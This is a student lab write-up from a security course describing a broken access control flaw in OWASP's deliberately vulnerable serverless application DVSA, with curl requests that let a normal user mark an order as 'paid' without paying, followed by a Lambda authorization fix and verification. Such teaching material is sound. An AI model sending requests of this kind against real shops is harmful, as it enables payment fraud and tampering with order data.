# Lesson 5 — Broken Access Control

**Course:** ICS-344 — Information Security  
**Section:** 02  
**Vulnerability:** Broken Access Control  
**Lesson:** #5  
**AWS Region:** `us-east-1` (N. Virginia)  
**Application:** OWASP Damn Vulnerable Serverless Application (DVSA)

---

## 1. Overview

This lesson demonstrates a **Broken Access Control** vulnerability in the DVSA application. A normal authenticated user can directly invoke backend functionality to update an order without completing the intended payment or billing workflow.

In a secure system, only trusted backend workflows or authorized administrative users should be able to modify an order status. However, the vulnerable backend accepts a crafted request using the `update` action and processes it without enforcing proper authorization.

---

## 2. Affected Components

The main components involved in this vulnerability are:

- **Amazon API Gateway** — exposes the `/order` API endpoint
- **AWS Lambda** — processes order actions through the backend order manager logic
- **Amazon DynamoDB** — stores order data
- **Amazon Cognito** — provides authentication tokens
- **Browser DevTools / curl** — used to capture and replay authenticated API requests

---

## 3. Root Cause

The vulnerability exists because the backend Lambda function does not properly validate whether the authenticated user is allowed to perform the `update` action.

The main issues are:

- The backend accepts the `update` action from a normal user
- No authorization check confirms that the user is an admin or trusted workflow
- The order state can be modified directly through user-controlled input
- The expected workflow sequence is not enforced
- Billing completion is not required before order status modification

As a result, a normal user can bypass the intended payment workflow and directly update backend order data.

---

## 4. Environment and Tools

### Environment

- DVSA deployed in AWS
- AWS Region: `us-east-1`
- Target API endpoint:

```bash
https://<API_ID>.execute-api.us-east-1.amazonaws.com/dvsa/order
```

### Tools Used

- Browser DevTools
- `curl`
- `jq`
- AWS Console
- API Gateway
- Lambda
- DynamoDB

---

## 5. Reproduction Steps

> **Security note:** JWT tokens and real identifiers should not be committed to GitHub. Use placeholders such as `<TOKEN_B>` and `<ORDER_ID>`.

### Step 0 — Define Variables

```bash
export API="https://<API_ID>.execute-api.us-east-1.amazonaws.com/dvsa/order"
export TOKEN_B="<USER_B_VALID_JWT_TOKEN>"
```

### Step 1 — Create an Order

```bash
curl -s "$API" \
-H "content-type: application/json" \
-H "authorization: $TOKEN_B" \
--data-raw '{
  "action": "new",
  "cart-id": "exploit-cart-001",
  "items": {"1": 1}
}' | jq
```

Save the returned order ID:

```bash
export ORDER_ID="<RETURNED_ORDER_ID>"
```

### Step 2 — Add Shipping Information

```bash
curl -s "$API" \
-H "content-type: application/json" \
-H "authorization: $TOKEN_B" \
--data-raw "{
  \"action\": \"shipping\",
  \"order-id\": \"$ORDER_ID\",
  \"data\": {
    \"address\": \"test\",
    \"email\": \"test@test.com\",
    \"name\": \"attacker\"
  }
}" | jq
```

### Step 3 — Exploit the Broken Access Control

Send a direct `update` request as a normal user:

```bash
curl -s "$API" \
-H "content-type: application/json" \
-H "authorization: $TOKEN_B" \
--data-raw "{
  \"action\": \"update\",
  \"order-id\": \"$ORDER_ID\",
  \"items\": {\"1\": 1},
  \"data\": {\"status\": \"paid\"}
}" | jq
```

### Expected Vulnerable Result

The backend accepts the unauthorized update and returns a successful response such as:

```json
{
  "status": "ok",
  "msg": "cart updated"
}
```

This proves that a normal user can directly invoke backend functionality and modify order state without proper authorization.

---

## 6. Evidence Collected

The report evidence includes:

1. **Order creation screenshot** — shows that the user created an order normally
2. **Shipping update screenshot** — shows that shipping information was added successfully
3. **Exploit screenshot** — shows that the unauthorized `update` action was accepted
4. **Post-fix screenshot** — shows that the same exploit failed after applying the fix

The key proof is the successful backend response after the unauthorized `update` request. This confirms that the Lambda function allowed a normal user to perform a restricted operation.

---

## 7. Security Impact

This vulnerability can lead to:

- Unauthorized modification of order data
- Payment workflow bypass
- Privilege escalation from normal user behavior to restricted backend actions
- Business logic abuse
- Loss of integrity in order records

Because API Gateway exposes backend actions directly, any missing authorization check in Lambda can become a critical security issue.

---

## 8. Fix Strategy

The fix should enforce server-side authorization before allowing sensitive backend actions.

Recommended mitigations:

- Restrict the `update` action to authorized users only
- Check whether the user is an admin before allowing order modification
- Enforce proper workflow sequencing
- Prevent direct client-side control of sensitive order status fields
- Validate all user input before processing
- Avoid trusting client-supplied state changes

---

## 9. Code / Configuration Changes

### Access Control Fix

```javascript
case "update":

    if (!isAdmin) {
        return callback(null, {
            statusCode: 403,
            headers: { "Access-Control-Allow-Origin": "*" },
            body: JSON.stringify({
                status: "err",
                msg: "Unauthorized: update not allowed"
            })
        });
    }

    payload = {
        user: user,
        orderId: req["order-id"],
        items: req["items"]
    };
    functionName = "DVSA-ORDER-UPDATE";
    break;
```

### Safe Parsing Fix

```javascript
const req = JSON.parse(event.body);
const headers = event.headers;
```

### Boolean Handling Fix

```javascript
isAdmin = (val === true || val === "true");
```

---

## 10. Verification After Fix

After applying the fix, the same exploit request should be repeated:

```bash
curl -s "$API" \
-H "content-type: application/json" \
-H "authorization: $TOKEN_B" \
--data-raw "{
  \"action\": \"update\",
  \"order-id\": \"$ORDER_ID\",
  \"items\": {\"1\": 1},
  \"data\": {\"status\": \"paid\"}
}" | jq
```

### Expected Secure Result

The backend should reject the request:

```json
{
  "status": "err",
  "msg": "Unauthorized: update not allowed"
}
```

or return an HTTP `403 Forbidden` response.

This confirms that unauthorized users can no longer modify order state directly.

---

## 11. Structured Operation and Security Analysis

### Table A — Intended Logic vs Exploit Behavior

| Vulnerability | Intended Rule(s) | Artifacts Used to Infer Rule | Normal Behavior Evidence | Exploit Behavior Evidence |
|---|---|---|---|---|
| Broken Access Control | Only authorized users or trusted workflows can modify order state | API requests, Lambda logic, API responses | Order is created and processed normally | Unauthorized `update` action succeeds and returns `cart updated` |

### Table B — Deviation and Fix Summary

| Vulnerability | Why This Is a Deviation | Deviation Class | Fix Applied | Post-Fix Verification |
|---|---|---|---|---|
| Broken Access Control | A normal user modified backend order state without authorization validation | Intentional misuse / security-relevant abuse | Added authorization check in Lambda before allowing `update` | Unauthorized update is blocked and order remains unchanged |

---

## 12. Lessons Learned

This lesson shows that authentication alone is not enough. A user may be logged in, but the backend must still verify whether that user is authorized to perform the requested action.

In serverless applications, API Gateway can expose Lambda actions directly. Therefore, every sensitive Lambda operation must enforce authorization on the server side. The secure design principle is:

> Never trust the client to control sensitive workflow state.

Order status changes, payment confirmation, and administrative updates must be controlled by trusted backend logic, not by user-supplied API requests.

---

## 13. Safe Repository Notes

Before uploading this README to GitHub:

- Remove real JWT tokens
- Remove real user identifiers if not required
- Remove sensitive API keys or AWS credentials
- Use placeholders for API IDs and order IDs
- Keep screenshots readable but redact sensitive values

---

## 14. References

- OWASP DVSA Project
- AWS Lambda Documentation
- Amazon API Gateway Documentation
- Amazon Cognito JWT Authentication Concepts
- ICS-344 DVSA Course Project Materials
